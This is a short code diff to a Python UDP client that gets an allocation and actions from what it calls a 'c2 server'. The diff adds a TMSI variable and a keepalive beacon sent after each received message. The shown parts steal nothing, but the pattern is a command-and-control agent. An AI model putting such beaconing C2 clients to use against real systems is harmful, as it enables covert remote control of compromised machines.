@@ -33,6 +33,8 @@ def udp_sendto_action(socket, host, port, action=''):
         ssimsi = ssreimsi.group(1)
         required_action = re.findall(regex_matches_required_action, stringdata)[0]
 
+        TMSI = ssimsi
+
         udp_sendto_nowait(socket, host, port, str(random.randint(100,999999999999)))
         print(f"Got allocation, c2 server is in {ssmode} mode, IMSI: {ssimsi}, required action: {required_action}")
         
@@ -59,11 +61,15 @@ def action_handling(action):
         sys.exit()
 
 def socket_listening(socket):
+    global dsthost
+    global dstport
     while True:
         data = socket.recv(1024)
         print("Received data from server:", data.decode('utf-8'))
         if data.decode('utf-8')[:6] == "ACTION":
             action_handling(data.decode('utf-8')[6:])
+
+        socket.sendto(bytes(f'keepalivedconn', encoding='utf-8'), (dsthost, dstport))
     
 if __name__ == "__main__":
     setup_socket(57758)
